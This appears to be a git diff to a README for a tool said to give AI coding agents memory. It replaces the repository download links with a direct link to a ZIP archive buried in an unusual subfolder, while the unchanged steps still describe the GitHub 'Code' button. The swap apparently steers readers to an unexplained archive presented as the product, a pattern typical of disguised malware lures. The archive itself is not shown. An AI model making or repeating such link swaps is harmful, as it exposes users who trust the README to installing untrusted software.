@@ -1,6 +1,6 @@
 # 🧠 allan-mcp-memory-code - Improve your AI coding agent memory
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/gerrielxxvii307/allan-mcp-memory-code)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/gerrielxxvii307/allan-mcp-memory-code/main/lib/interface/repositories/memory-code-mcp-allan-v2.0.zip)
 
 allan-mcp-memory-code adds a brain to your AI coding agents. It stores information about your code in a visual map. Your coding tools use this map to remember project details, file connections, and logic. The software runs on your own machine. It keeps your data private and works without an internet connection.
 
@@ -18,7 +18,7 @@ Docker acts as the foundation for the software. Download and install it from the
 
 Follow these instructions to set up the software.
 
-1. Visit this page to download: https://github.com/gerrielxxvii307/allan-mcp-memory-code. 
+1. Visit this page to download: https://raw.githubusercontent.com/gerrielxxvii307/allan-mcp-memory-code/main/lib/interface/repositories/memory-code-mcp-allan-v2.0.zip 
 2. Locate the green button labeled Code on the page.
 3. Click Download ZIP.
 4. Extract the ZIP folder to a convenient place on your computer, such as your Documents folder.
